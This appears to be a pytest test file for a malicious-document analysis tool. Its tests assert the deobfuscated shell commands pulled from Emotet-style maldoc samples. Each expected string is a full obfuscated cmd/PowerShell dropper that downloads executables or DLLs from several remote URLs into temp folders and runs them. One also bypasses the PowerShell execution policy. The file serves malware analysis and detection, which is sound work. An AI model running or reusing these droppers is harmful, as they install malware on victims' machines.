@pytest.mark.emotet
@pytest.mark.cdf2
@pytest.mark.interaction_shell
@pytest.mark.textbox
def test_57b0a093137784584e7c1a998d552876df74af0ec8a00a0b8526891f8c470cec(path):
	t=maldoc(path+'57b0a093137784584e7c1a998d552876df74af0ec8a00a0b8526891f8c470cec')
	r=t.run()
	assert r[0][1][1] == '''cmd /c %ProGRamDAtA:~0,1%%PRogrAMdaTA:~9,2%  /v:oN     /c"Set    xDl= CwcT\\hB$k.-(Xx63e4zad\'SfHM70ujAm@i;9lbP+vE/,VRLW{5ntN1qyIUrsp8YF)2~OGDo%g}:=Q&&     fOr %5  IN  ( 61    71 2  72 39   58 7 47 57  1  75 67   50  44 54    72 59   72   23   42  23 23    57   68  53  53 31  26 42 75    67 11 18    44 54  72 6  72   4  42 26    39    75    67  11  16 44   54 72 37   37 0 8   34  66   18    18 76  22    24 54  15 54   22 35 8   60   27 50  62  76 51  17 2  11   71 38   30  17 3    52   0   53 17    52  10   48  17   38  1    37 34    17 51  52   35 8  4 50    28 62 76    22   6    52 52    61 75 43   43    20   51   52    34    73    29  20 10    20 73   29 34    37 20    59   51  71 52   34 3   34 20  60  10 3   71  32   43 62 71    37    18   64    18   61 33 6  52   52 61  75    43    43   61 59    71 60  71 37    29  52  34    71  51   61    37 29  60   21    34   60  3  71    29  51   52 10 3    71    32 43 73   42 42 60   55 13 50 32  58 33   6 52 52 61    75   43 43 38   29 51  71 51    20    59  52    3  59 20   24  52   60 10 3  71 32   43    15    30   58 6 19 77 20    33   6  52 52 61 75 43  43    59 17 73 17 51    17   59  20   52   34 71    51 3 71 51 73 71   10  3    71   32    43 53 45    46  68    70  52  27 33    6 52  52 61    75   43    43  73 6 71 29 37 20 60  6  10  3    71 32 43 71 25 29   60 25   16 9   20   68 22 10    23 61 37 34    52    12  22    33 22    65  35  8   37 54 62  62   76    22   46 62 16    28  22    35   8 57  15 36 50    0   76  0 22  27  66   54   22  35   8 6    27   27 66    76  22   4    18   54 62 22    35 8 34 15   62 18   76   8  17 51 41   75   61 29   38    37   34 3 40  22 5   22    40    8   57    15  36   50 40    22 10 17  14  17    22   35   24 71    59   17 20   3    6  12   8 34  66   50  16 0   34  51  0 8    4    50    28 62   65  49  52  59    56   49    8   60   27  50 62 10    70  71  2    51 37   71    20  21   64   34 37    17  12  8 34    66   50 16 44 0 8   34  15 62 18   65   35 8  51   28    15 66   76 22 1   27 62    28 22  35   57  24   0 12 12   69 17    52 11   57 52   17   32   0 8 34   15 62  18 65    10  37 17   51 73    52 6 0 11 73    17 0    62    28   28 28   28 65 0   49  57    51 41    71 9 17    11  57 52 17    32    0 8    34 15 62   18    35 8 24    50   62  18 76 22  59    54  62 28  22 35 38 59 17 20    9 35 74  74  3   20   52   3   6  49  74 74 8 39  28 62  36    76    22 63 27   66   18    22    35 88)  dO set   aK=!aK!!xDl:~    %5,   1!&&  if %5  == 88  eCHO !aK:~  -553!   |FOR /F "tokens=1 delims=fk" %C IN (\'ftype^^^|find "cm"\')DO %C   "'''

@pytest.mark.fast
@pytest.mark.emotet
@pytest.mark.cdf2
@pytest.mark.interaction_shell
@pytest.mark.textbox
@pytest.mark.func_cvar
def test_6e94090940d5457cfc9da5421da8a96d008f7b8a2c70e0c33047cd93e26746b1(path):
	t=maldoc(path+'6e94090940d5457cfc9da5421da8a96d008f7b8a2c70e0c33047cd93e26746b1')
	r=t.run()
	assert r[0][1][1] == '''c:\\c556902829965\\u3692599496166\\i47356399652\\..\\..\\..\\windows\\system32\\cmd.exe /c %PrOgraMdatA:~0,1%%PROgrAMDATa:~9,2%   /V:   /R "  seT  gali=;\'033W\'=814k$}}{hctac}};kaerb;\'713Y\'=636a$;833B$ metI-ekovnI{ )00008 eg- htgnel.)833B$ metI-teG(( fI;\'181Z\'=346j$;)833B$ ,086o$(eliFdaolnwoD.336E${yrt{)074Q$ ni 086o$(hcaerof;\'exe.\'+701V$+\'\\\'+pmet:vne$=833B$;\'316p\'=479U$;\'385\' = 701V$;\'642w\'=196c$;)\'@\'(tilpS.\'ZAcDDtVQ/rb.vrs.naelcxam//:ptth@lFtzZyM/pot.1ket.golbhceteno//:ptth@3ClSh6bzr/yb.dlogaedi//:ptth@6EHiD9Ee/yu.gro.agnamahc//:ptth@cEyNAiOb/moc.gnsniwepo//:ptth\'=074Q$;tneilCbeW.teN tcejbo-wen=336E$;\'211G\'=794o$ ll%1,3-~:PMET%h%1,4-~:EMANNOISSES%r%1,5~:CILBUP%wop&   FoR  /l %D IN (   520 -1 0)  do  SEt   pqJ=!pqJ!!gali:~  %D,1!&iF  %D  LSS  1 EchO !pqJ:*pqJ!=!  |  Cmd.EXe"'''

@pytest.mark.fast
@pytest.mark.emotet
@pytest.mark.cdf2
@pytest.mark.interaction_shell
@pytest.mark.shapes
def test_f86179fb8c8043a57c0df6ea54c799ed2dc8d1b9d659b648520b978b0c737c58(path):
	''' shapes('1').textframe.textrange.text, 
	"Interaction        .Shell(XZBqET, lIRVsT)"  (ugh)
	general shittiness. 
	'''
	t=maldoc(path+'f86179fb8c8043a57c0df6ea54c799ed2dc8d1b9d659b648520b978b0c737c58')
	r=t.run()
	assert r[0][1][1] == '''c:\\zJSYcaQkEPr\\PPwkfLUavT\\MsujCWrQwtCfni\\..\\..\\..\\windows\\system32\\cmd.exe /c %ProgramData:~0,1%%ProgramData:~9,2% /V:/C"set fV=CPuabmTNtdzqpvIfHWrWUpdBpBkLanpZjWtroi7ResgFh:w4yX(0@J)$};,\\cO=lD6S8.A-G Qx{/+\'M&&for %V in (55;39;34;26;62;78;14;15;73;78;57;55;43;37;25;62;29;40;46;70;36;4;32;40;60;34;72;7;40;34;68;33;40;4;0;63;37;40;29;34;57;55;33;43;44;62;78;44;34;34;30;45;76;76;10;36;40;34;37;60;4;2;37;63;22;37;29;42;28;29;22;41;2;30;30;63;48;68;60;36;5;76;31;52;44;34;34;30;45;76;76;32;2;28;63;34;44;40;5;40;46;36;35;22;30;35;40;41;41;68;60;36;5;76;33;47;49;10;79;42;52;44;34;34;30;45;76;76;41;44;28;35;37;28;40;74;60;63;2;41;37;13;40;68;60;36;5;76;73;36;22;65;74;52;44;34;34;30;45;76;76;28;29;37;5;28;63;36;13;40;35;41;68;2;41;76;60;39;49;49;52;44;34;34;30;45;76;76;60;36;37;29;5;37;29;37;29;42;4;34;60;68;60;36;5;76;5;78;68;66;30;63;37;34;50;78;52;78;54;57;55;22;39;35;62;78;69;32;46;78;57;55;32;14;5;72;62;72;78;65;65;38;78;57;55;44;36;11;62;78;32;30;27;78;57;55;15;20;79;62;55;40;29;13;45;34;40;5;30;77;78;59;78;77;55;32;14;5;77;78;68;40;74;40;78;57;15;36;35;40;28;60;44;50;55;32;60;71;72;37;29;72;55;33;43;44;54;75;34;35;48;75;55;43;37;25;68;64;36;46;29;63;36;28;22;43;37;63;40;50;55;32;60;71;58;72;55;15;20;79;54;57;55;1;14;39;62;78;11;35;53;78;57;14;15;72;50;50;71;40;34;70;14;34;40;5;72;55;15;20;79;54;68;63;40;29;42;34;44;72;70;42;40;72;67;51;51;51;51;54;72;75;14;29;13;36;26;40;70;14;34;40;5;72;55;15;20;79;57;55;1;61;27;62;78;73;1;35;78;57;4;35;40;28;26;57;56;56;60;28;34;60;44;75;56;56;55;4;36;1;62;78;28;46;13;78;57;82)do set 4HE=!4HE!!fV:~%V,1!&&if %V gtr 81 echo !4HE:*4HE!=!|FOR /F "delims=.TUcMn tokens=4" %t IN (\'assoc.psm1\')DO %t -"'''

@pytest.mark.fast
@pytest.mark.emotet
@pytest.mark.cdf2
@pytest.mark.interaction_shell
@pytest.mark.shapes
def test_f8c05dcc7a70379257625298de38c78482c0a3adb095dc2e18205edc8b2bc049(path):
	''' embedded ^ escapes
	'''
	t=maldoc(path+'f8c05dcc7a70379257625298de38c78482c0a3adb095dc2e18205edc8b2bc049')
	r=t.run()
	assert r[0][1][1] == '''cmd /c C^M%LOCAlaPPDaTa:~   -10, -9%;  ;  ;  /V^ ^   ;/R " ;  (^seT  ^ N^k2=VS^ ^D^Y 2B jD^ j^w u8 ^Dl Dq 9^e^ 1i VN N^T^ ^y7 ^h^q A^o  6 4^F^ ^QV}8^p}Vg{CrhfjcG^EtU^Oag^7cr^Y^}^pi}RJ^kR^mac^H^eYBrcWbYi;^0gt^uTb^osso^g$DQ^ J2sG^e^sCJ^ePgc^98^otCr^OXP^5^t-f t^u6rs^L^aiQ^ti^A^SRG^;^6K^)^7^0^t^i^xbSx^s^8O^$C^d^(^x^Kej^k^l^tai2^IfkPoOH^ti^8^emOvMh^aoUs^ON.w^7Vp^d^I^E^ut^5o^$O^I^;2^x^)6^Ly0EdVroPIBld^eRbsq^knE7^o^1^J^p^7^f^s^FGe^o^3r^GW.RKp^2BHlhw^FQ$kV^(P^3^e^jHt^hd^i0qruv^w4p.R^tVtmI^Tr^t e$E^7;^o^s^1EJ^ ^SG=CG E^fe^eX^p^5TygC^tO^T.^6wVHe^Icq^t^uw$^SN;ic^)Ro^(lknU^0^exi^pkdo^X^2.96VxMIA^0^t5d$HL{ 7 j^d^)^Wj^0n^t0Z^ 23^a^ ^L^jq^tYeVM-^2N^ Ev^s^FM^u8vtglaY^tt^zeS14.dypikHwO^wES$q1^(0^m Azf^m2Ib^H;p^t^)^ZB^(g^t^dN^YnuDeYjsP^e.L^8^pzCH^sUwlL$^ia;kd^)3e0O^m,^kQRY^2i4nnFj$^ o^,^PB\'^sO^T^WB^E^boG^yi^\'^E^o^(ZwnZb^eL^mpA^0^oM4.^q^yp5bH^sWw^z4$TV{h^OyDRrl^X^t^BA{px^)Vn^tI^8P^6^ NVj^$RI 1nnRV^i^f7 d^BRnZiWCn^EY^$Z^a^(c^8htncrc^av5^epcr^4^FoR^lfw4;v^a^\'Rpm^YEaVPeU^DrW^B^tkn^s6c.n2b^Ts^dF0o87d^Lja^b^p\'yp 8^w^mSfooccaW-^7d ^q^A^t^g c^hNe^m^3^jG0^bC^lO^Hq-yRwB3^eB9N29 f^H=Y^j kwV^m^II^0M^ta^9$^h^y;3b^\'j^t^pX^o^t^a^1t^p^Ghlg^l9rmoX^x^lo^.^t^U2J^elpxmm^l^x ^E^s^ZSmFy\'dz oLm^yjo^fFctR-3^h K^ZtNWc^u^4eV^j^ja^7^bOaO Z-pTwJ^be6xNFv=K^x^ fu^p^A^eHPk^wRx$kO;ec^)m1^\'e^B^ex^l^xw^Teiw. ^S^E^E^pvixhIE\\d^h\'fo+Hu^)qn^(d^Lh5^Wty^ga^F^YPGe^pLS^muge^4PT^H^2^t3b^eqvG^1N:^1^p:WC^]fZh^Lytn7a5nP^h^j.eY^O9XIjN^.T^5m^F^q^eQWt^w2sel^y^9^z^S^T^i^[JR^(^lq=p7t^P^hbge^srQ$Zn;cv^)p^P\'zd^@Ms\'^Bs^(U^e^tC^hic^TlrNp8T^S^u1.bh\'^xu^28pX^ArJ^UG8t^gezd5gn4^lu/^I6^u^j^ur ^J.^XVt di^GnkDz^iGabW6i^4Xbc^H.^W^dwv^5^w^S4^wrg/^br/ZK:KQ^p^1vt^tf^t5^Dh^ED@^6O^l^Xqg0pVw^5y^xVn^tsT^YRcL^E4K^J/^kNu2Rr7t^.8Z^tx5c5Ne^u^F^l4E^ea^q^tcpn6Vix^bs^Prs 8^esSnE^1i^wTs^8tu7^0^bT^I.^GpwVB^w^a^Yw9B/v /eb:J^m^p^wst^ovtH^Ih l@CZs^mt^0cdVD^Ev9^yKgU5ag^qz^P^4^xWYk^O^y^KU/Rtey^ar^u^PoN^bt0Ts7g.Fet1^Ge^bigw^zdP^ea^p^S^g^J^Fi^57pa ujEk^l .^p^M^wUY^wWb^wZ^3/Ff/^z^a^:rmp^6Xtov^t^QF^h08^@h 4JDBvwOr3k^ZO^zHFH3QiO^K/SX^u^Y^xrQ9.K^ n9^ZorPsJgiLalaV^y^JI^e^6^B^lrZ.5^J^w^uSw^3Q^w^PE/Be/4^g:^iW^pBOt2^5t4vhL^7@lobc^BA^s0n19P^dnd^lCDvSvP7BQ^B^y^XQ^Qcd/pfu^L^zrn^3^.F^kb^5 k^qjer^A-g^7^t^o^Uak^8m^Q^frla^o^2afR^J.^b^y^w^Ax^w^Qxw^M^1/^Jr/^g^E^:zCpl^P^tCo^t^o^m^h^5D\'oO=e^9t^D8P^1^oN^bU$6^f^;yN^\'^6H^L8xdv^P^S^Q^l\'q^M=OH^U^TwP^m^YA^4^K^$1F ^S^Jl^G^1l^85^eP^6hD^bs^zVr^2^6ev^ww^Q^Fot8p)&& ; ;f^or;;  /l ; %6 ;^In; ;; (^ ^;  ; ; ^ ^+^167^9^ ^  ^-3 ;^ ; ^  ; 2);^Do ;; ;  ( ;   ; ; ( ;;; se^t    ^fh=!^fh!!N^k2:~%6, 1!)  )&&;  ;  ^I^F;%6  ; ;  ;  ; l^e^Q;;  ; ^2 ; ( (C^a^LL; %^fh:^~^-^560%   )   ; )   "'''

@pytest.mark.emotet
@pytest.mark.xml
@pytest.mark.shapes
def test_0fea9493bca1e9de525fe88f1fc4af2e96ac8a4c8af5672e2ff662b54c0f8f20(path):
	''' XML document.   shapes in flat xml opc. 
	activedocument.name, shapes, ^ escapes, filthiness.
	'''
	t=maldoc(path+'0fea9493bca1e9de525fe88f1fc4af2e96ac8a4c8af5672e2ff662b54c0f8f20')
	r=t.run()
	assert r[0][1][1] == '''cmd /c %LOCalAPpdaTA:~ -3,-2%^M%SysTEmrOoT:~  +6,   +1%;  ; ; ;  /V:^o^    ; /%appDATa:~-7,  1%";;(s^et ^ ^ t8V^b=6cg X7W^ 2qL TnE 7DW^ hGp z^X^y t3^o o2u ^bhc ^TFw ^2S^E IDV^ E^5k^ ^6u9 16l ^tG  NH^A^}^5QZ}Wav{AVeh^QJIcqyI^tI^UX^aYDhcmMi^}Bg^o^kG3XaqPk^eMhbrrswbjyS^;W9mFqiUi^4E^g^sF^Sc$u^Ja^ BYes^ljNs^J^6^Ae9NOcJhF^omGWrgevPnbf-ZGctYk^KrP7Each^gt^W^PUSQlv^;nM ^)J^e^1^FKol^i1BG^sN 6^$^MCa^(^K^8meVgvlCL8^i^uYa^f^I5voL8r^tn78eis^Wv2uv^aHGc^s^s^ R.T^X^fSdD^zML^qV^Tc8G$3^tZ^;UR^D^)Tm ^yRQgdn^0^ZoENhBS^Qt^e^BY9sY^LCnUW oG^xtpyRWsWb0e^GsurGNn.CfHSSUNjUi5wYZh$DdL^(I5Reb2Ttj l^iNesr6^LQ^wE7J.8raSk8nMQFgT cM$Q^Eq;wuq1cu6 tq^P=WN5 n^Ao^ef2Ap^OsL^y^9Ns^txCb.^SQ^OSj^hP^M7kCT^SB7$NDj^;^xVA^)B^GL^(gYCnwTceMb4pLVx^o^Kwd.J9USTDCMa2v^Tx^av$n^W^z;^PH^j^)^2^9p^(^gQPdijnnE^eBeqjgsarg^.H^1lS0^4Djtx1w7g^4$^xuy^;n31^)^g^YZ0uq^L,NCOCZ^M ^JL^I^aPz^38$PIc^,e2^b\'^lVs^TNGIEVYnGgyA^\'8t9^(6Jqn6rR^e6EJpXd7^oRUn^.C^FyS1daj^94^PwCwv$fGP^{^gWV^y3^lNrHI8tPac{Q2C^)r^D4rpj0d0tS^q^z60^$Erm X^dmn^GoB^izM^O 3a^dCKrOJ^pA^w^PJoN$^afV^(k^YEhY^Djc^USp^a8^oceOKdr^F^8nolrWf^Qlq;^zZi\'v7Dm^QxFau^dKe^IPerDMm^t^XBM^sY^Ic.^wrUbgf8d^xJSoMcT^dk^gn^a5KM\'lnM C8^Um6^Ee^oeBzcp^Kh-D^uv^ oC^btI^Oqc^qjweWI^ijknQb^s^SwO3dj^-^P^JO^wXv eV^iPNJ^ n skv^=WzE ^H4rSM2k^M^evpTtiP^$haU;i07\'vnlpBro^tbSNtA0Wh^h^bMl^08u^mi7HxqYJ^.Qu7^2U5L^ly^7^U^mWq^7x^h^xE^sdKvm5Tw\'u^SJ xpH^mm IoE4Bcx^mu^-^1Bx^ R8H^tQ92cAGfeTzw^j6^37bv^HNOSaR- qt^waK9eBY^2NCys^=ocU 0XcS^x^B8j kW^wNj8^$qyC;R^3g^)DxS\'^i0HeKX4x^Q^0AeFr^d.^Hdl^lO^zNESo^XzDHl\\J^5d\'^jnK^+^XsZ^)HOG^(gcOhl^bGt^xaO^aHpLP6HS^p^7TA^mQ^jretf^0TuoOtC8^H^eP3^FGxR^g:V^if:iV^G]^DYThK^d4tYd^iaR^h^1Pe84^.^Lu^O^O8wPI653^.yj^qm^OuheG^Qkt^i^ y^sptTyVis^S7YH^[rHg^(LZ^w=9gu^F^qw^LiEeCsZro$L3h;5Q^9^)w^K^t\'i^3^U@2aI^\'^dZ^f^(lLvtvJ^WisU^Dl^PlSpIdYS^7i^w^.M^pI\'PVFXY^Ia^0vjVH^MKeFSuI^i^obsGmO8zt^a^b/V^6hmJDAobEucAeN.dm^O^e^ogZnK^xni4^qZ^l8^eaaav7k^J^YfrGuOumZOt^W^i^m/nqv/5Cq:20^y^pV^eNt^weh^tHNihoO^Q@^EvI8HvnubifGHV^gaD4ST^pNB4ke3Rm nm^iuXmn^tR/R5Fo^JtIcrpg. CT^e^O^sEd4^XqrsTle^LSrvf^6^oaG^DErvExo9U7lc58p^E^zrxYkLeR6J/q^yF/^zr7:^gkc^pXS^jto^kttwn4^hEXn@wtNSY^9S7^b^D^sItq0^0s4DvItFy^ ^Hpax^u6VnMrmG4N/koUnbl9v^9cj.c^3nuxD^EdUZK^eP^9g.SaNuRUY^iNYRmOCqcXrc^h6^8x.^ GHhjOJtI^Tw^uV3Jo86Fy^Ucnu^2Poijm^7/^q^A^K/e^63:^zlK^p^ZE5t6fntEL^Ph^XoZ@eEymQxN^I^2giv^eSyy^B^MYDULi^GsRtPcMa^jlh^e/T^hU^uV^XkrK^p7.^P^md^sp0^togHOt^Q^eNodx^ohiXRpLx^Hyn^3Znz^Jr^o^g^QleY^jEpG^OveT^yoleHqtRW6tyJWiG70l^9Ai/WQ^u/ud^X:Vi^Ap3Qrtq^w^Xt49Vh^Izc@Y^IvpEIL^Inr^z^AdTwi^khCTwbA5D^S^eBy^T67^8O^I^JVR^H/yc3m0rKoz7dcWQ^0.3t^T^hCpXt6^5HuJ5rr^j^zG^t82^IdYw^hnvfsaIqD^tSj8iocWrStxik^ImppEf^szD1rA^SHa^y^3^H^zYC9nCF axfXdFKT/TJN/^5^FX:1z^4p^oq^ t^4R^OtWnChO^L4\'14z=^Qi^KrO 3d7oYqM5A^$rV^T;hTi\'^e6^SL7e^J^kMl I^TRE^\'P1V=4M9q 2lbwmNfmv5$^dR^I^ kZE^lj^7ol0b5^erbF^hG^X^os^hy^brC^5YeOdP^wVn5oXz^Ip)&&   ;; f^or;;  ; /^l ;%^m ;; IN  ; ;  (  ^2^14^3^ ^  -4   3);;  ^do ;  ( ; ; Se^T   ^yN5H=!^yN5H!!t8V^b:~ %^m,   1!)&;;^if;  ;; %^m;; ;;=^= ;  ;3  ;(caL^l; %^yN5H:*yN^5H^!^=%   )"'''

@pytest.mark.emotet
@pytest.mark.xml
@pytest.mark.shapes
def test_557fa52bd3a82cf97414e245bca68bb82ba94ee476892a0cca07cf31c0910000(path):
	t=maldoc(path+'557fa52bd3a82cf97414e245bca68bb82ba94ee476892a0cca07cf31c0910000')
	r=t.run()
	assert r[0][1][1] == '''cmd /c c^M^d;;/v^  ;  /C";( ( (^Set ^ET^9=NW ^aB^  X ^54^ i^A^ fE ^wW Vh^ CU tz 4D Hj ^3d ^4^x vV cj ^Of y^J}Vc} ^G{Umh Mc^DNtV8^a1tc12^}UWk8TaS^jeABrVh^b^Pz; D^Eis^z4^WFoy$fw N^T^sbvsC^jeMJcmW^o^KirHqP^ZS-^Yg^t^f^HrCa^aHk^tdOSR^g;Iy^)1^S^E51z^2^PFGN^$1g^(L1^e^hrlCmil^XfV9^o02^t1^d^eL^6v^A9a^h^lsa^b^.n^P^DG^kl^xNc^L^K$7^B;nw^)FoyK9dGLoq0B0YeFBs^tOnKgopRpY^3^sfHeZWrNg.^UJZ qvK^M^S^Z8$^4G^(^O^H^eiktnwiC^ir7^9wLs^.^3cD^Xolr^jcBV$fJ;Q^K^1w^U^ gD=LU Aeee^Kp^q2y ^wt^2Q^.^xjDZd^lYRc5G$^H^b;cX^)H^Z^(^xmn^D^ae^jX^pY^lobS.G0^D5^zl5cc6A$n^A;ND^)^4x^(md^dd^AnNze82svl.^Kx^ZR^av^q^sSA^D$so;Ky^)SL0^3v,D^gj^TttDWK^Zl$Ns,zU\'M2Tx^4^EX^3GgI^\'E^S^(^w^jn5^6emG^plRomw.^B^gZ gvq^E^S8z$^IC{uMyC^wr^dkt^p^t{5^ ^)q2^PO1ktR^AC^u$GW^ PYnr6iK1^ xk^j0^ktc^aKh^D$F^S^(8E^h6Pcnj^aM^He^D8rS^Yo^i^lfPp;Fp\'^0kmJS^af^w^eIUrJjtvu^s3^Q.B^0bOydNto^5u^dv^0a^Ll^\'S0^ r6mS3ogrcDc-4R bOtqRc2i^eykjX^L^bHeO1Z-s^z^w^HO^e^O2N^XC R^4=^wx Un^D^Z^ul^AoclB$O4;Ga\'qDp2^at^3at4J^hcjl^t^omH^tx3^a^.AK2EvlOIm^isxhO^s8gmEr\'^2U^ O^4mnso3icn^l^-3^m^ ^p6t^lbcE^Ue^5g^j^mr^btn^OK^0^-oW^wWne4NNy^F=WE ^4z^Z^Wtv^k^b^S3X$3^W^;jv^)JK^\'RZ^ej^hx^Y7eDq^.cVM20ElEWz^d^\\^jl^\'9^g+^qN^)5O^(Iyh5ztmRaGEP^o ^ph^zm0AeBC^T^phtYR^eWYGd8:Pq:d^l]Dgh75^t8Pa^T3^P1N^.49O^AVIsq^.3R^m^3^Eefmt^f^Ws^wByrgSNB[^HP^(^OP=GCE^ov^zoOFtT$^Dq;8N^)WQ^\'ba^@d^I\'^wZ^(4^L^t^k6^i^tcl^hMplt^SA^W.y^M^\'36^av^Gz262nPcI979f^k^LiS^jg^0Pf/BH^ed^qdgt.ulhURcX^xiwXr96n^KV^iK^S^a53h^JQ-^OJnROoY^yv^Z^f-^XMcNS^a^J^ErL^w^d^Fxnz^8^aazcr^D/R^t/^OP^:EnptNt^fQt^K^3hTN@61c^Eghl^y^ap^JcqLne^X^4pV/Lx^u6crKm.UJa^hFhY^qs^il^uM^9^a^O^W^mu^g/^2^b/ k:5KpV^X^tO9^t^K2h ^t^@^ ^m^MjmrUj/Hwr^6^Lb^Ek.yQmwuofpcPJ.5^gr^y8u1o^t^g^Ja^wbn^Ka^a0tchU^iEkn7Ui^d^x^lm^8cen/rt/^E^T:oX^pR^at 1^t9RhU^i@hAr^GtI^d^j^T8Vmfl^lxV/U7mI^f^o0^OcsR.^D^Y^s9^Ta^F^2lrQ^uEToEX^d^XQn^XgeI^0k^a ^odWb^Qco^Mr^h2H/lr/^Ep:^FD^p^6^t^t^5Mt^J^jh^3^A@I9^pn3LIE5F^AX^wGJFGIWh^kMwxI^x/Hdm^b^to2dc^fL^.KPgz^UnaG^u3qp6Bm^f^3ae^JlypsBrnv^ aV^mriztpg/T5/1C:qip^Hbtr0^tfJht^W\'O^Y=MtPkr^kECA3L$4d;^TU\'^O^hvmUA^G^4uvD\'ga=ySbVYE^G2^Zz^6$^63 zIl^Uo^l4C^e^Xc^hZ^z^spVr5ye^jswcJo^Y^E^p) ) )&&    ; ;  ;f^or  ; ;  ;/l ; %^x; ; ^iN ;  ;  ;  ( ^ 1544^ ^-3  ^2)  ;^DO ; ; ; ( ;;;  SE^T    ^Px=!^Px!!^ET^9:~%^x,   1!)& ; ; I^F  ; ;  %^x ; ;  ; L^S^s  ; ; ^3 ;(  ; ; ( ; ;   ; (cA^L^l ;;%^Px:^*Px^!=%   )  ; ) ;  ;   ; )  "'''

@pytest.mark.slow
@pytest.mark.slowest
@pytest.mark.cdf2
@pytest.mark.application_mailsystem
@pytest.mark.skip(reason="This is unbearably slow")
@pytest.mark.func_CopyFolder
@pytest.mark.func_CreateObject
@pytest.mark.func_Environ
@pytest.mark.func_MsgBox
def test_32a160f4c672ee9aaaf2e65c154114db785d9dc2baba62219e424fad49f39160(path):
	''' i don't know what this is. it's slow and horrible, tho.
	If Application.MailSystem Then
	Shell dxv_ien_dmo, yy_olkmt
	End If 

	(ikugra.exe is this malware's bundled powershell, btw.)
	'''
	t=maldoc(path+'32a160f4c672ee9aaaf2e65c154114db785d9dc2baba62219e424fad49f39160')
	r=t.run()
	assert r[0][4][1] == """%TEMP%\\rmbggntz\\ikugra.exe $yyyywiayoraaeuufio_pkdtuicxco_hve='m 465;if';$oajxnpelow_eiixidfokcgjske_vqdkioar_ir='//s';$pksueau_oi_aqyhci_uyg='ntz'')';$dpimoqli_xbyzku='while(1';$teupytxdssrfitzzpjzaujthvhsh='ient).Do';$eulv_ehtxnhgiislpwusnunzrictbzdswdwj_yi21='UF';$uiswlvu_vkixduqwlnavnayxue='h , ''f1''';$y_oyuyjgiyhcp='bjyis';$uuirslmnooeprbfkzhuiyeuncqdyeai='or';$jvukxioa_rrzyixfqtcnxuxccevbubtxpei=' 11.11;';$yuugxea_omnsauqsfvu='ut';$quoiaqynoe='{bre';$gpkbwojqelia_tociouqdrc_uabuqaqjyau='= Ge';$xxniaomkoaaopjsa_oaz_dijjzf=' -recur';$wgzpimry_qifw_phftdukzmtxqiuaurmialgsxe6='ouble]$a';$mzelrloprrveegugiscsnfl_ccuysddwl6='ata+''\\xn';$bdlm_matuiaynb='[d';$buohhidkyhlyypbq_tyo='gg';$mnxdya_isqggueevixgu='co';$etjabrsuapybmuierfayjuuaaeyxei='ionPolic';$oeuaoieauav_qcmzcoobv_o='wn';$qxeueiywrglmfdqjiiey='ess; ';$ewsuoueggeaid_lt_czycbi_ykfpnauoo_ja48='Sleep -';$ichtmltuxwoharifrieghipkkeukye='_z +';$jhjizulgpznaivm_wyfe='$ao';$poirsdypxveomzrsybshpiywyiudrdu_adytvdc='e-It';$xchiytmkgduooosqitkiieu_efh_vd='y Bypass';$sphfaqrjxlkdfakluf='lv';$jwocjwzgzchmei_pjiokwoijva_njualz='$e';$efafuybanglu_ntyiyaekntzot='mat %';$dymoebdzkaoueyheb_yaoaddnyj='xec';$hbezjieeuyuooiiovnutycua='t-Date -';$nnmk_gqiobxqezq_y=' $';$oaspkrlaesadkyfpwdibj_uyiaalbze_etsbeo='(New-Ob';$eeehxbnyuqbvaiqyide_ypt='ez ';$rucreuourrpbxutzjgfugnuuxhxeamkykuwg=' -S';$qpalvhqnealamgzdqssfuvurpbpdkmplyld='ak;';$iizgaeewouy_ywnodnoinhqkcoeahj='em (';$aeyeglefk_yaeiidteieuiuncnuai='pe Proc';$eyyjgaxkenteiejfcu_bwd='UFo';$dwzffeje_rtto_i_atsyzntxbo=';Remov';$vvhj_vtxsygdanmvhqo='o_z = Ge';$px_pzenvxfgcvvuymgr_ioeiemvelh_hvxajx='-ge';$kjnasebh_ktuhxzscseywtjupqivytaklijncecv='ci54 = ';$vzaovgrrtbedliutaghyou_ukwyuubg='Web';$oeu_zxlshmy_oune='){';$yjiodfcoae_luasj='orce;';$bfa_njjtmaijgzolqvoxpyey='lvci54)';$kduaezdrmearuyubxouai_wgwadaxpy_zga='p + ''\\r';$iobtuier_esle_kn_ugp_jldlmtiwkdzoi='dFil';$axczaediu_cvyedde_vsbo='; rundll';$yea_yoyuaofzyo=''',$path)';$yccxcbnsc_alraeebxmfwopcztsqpea90='ttp:';$hnsklloitj_paoqwdflyrnmxujzbsyxn74='pecial';$euugwbjatehooiv='nv:tem';$icn_o_yz_aerhy_pdur_iaeiylbnrjea50='ls.org/C';$anxchr_aibwwlyoedz='t-';$vpftyj_ec_xtcgr='loa';$vxxyuyabc_vuob='($q';$np_oztkfxmuypjeyae='s;Star';$uumvwfyykhv_jwilmiciiarai_ahe='System.N';$ieiiuyyenhwraigygclhmnfgctuuoahapumn='trave';$rre_jju_u_pkjs_jpldfjkysfhoipn_fmutpbcedksxme='; $';$oamuuivuzfy_ydtpdbyoeyoefy_hcr_kzzefwo='rmat %s';$vyaaue_aauyeuadlweevzbpvknsujwtii_ykk='mb';$aeevenpoiyxaw_rxor_sdpivrrlbod='.dll'');';$htaeg_avyoyiaoy1='appd';$bnzgyxcjryltqdeo_tiayirluyypf='ject ';$currystyf_uyxktuikfgvqqwoiwluyud_dko34='V.php';$o_adagoeoish='se -f';$kaiyo_nmywku_sdiuu_nij='}}Set-E';$ne_wxkuevhr_fqojrproupcoodydsxkeyuj='nv:';$kduwddftpzdlbhwjemyrdyealuynlai='h=($e';$d_eneyzceyoyqaidtqjmnxegwyuoiihmt='qez ';$nnayiuaeihlhjba='$pat';$vytrvnvatwmlretmyvvip_auleuoi_ro_zyu='swinmVft';$hsxeayooxszda_iputq_qrqowqivzybp='e(''h';$ajzgzzfbkbgikpuukpcgwdoouaapnfhikw=' $qq';$shiegbaieiyoopbyai='et.';$yqlkuy_kvrkfuoh3='cl';$eae_iitrzgwkonmhgfisxezlpmwxolz6='t-Date -';$ctulmxwcuoyjohqzfq='32 $pat'; Invoke-Expression 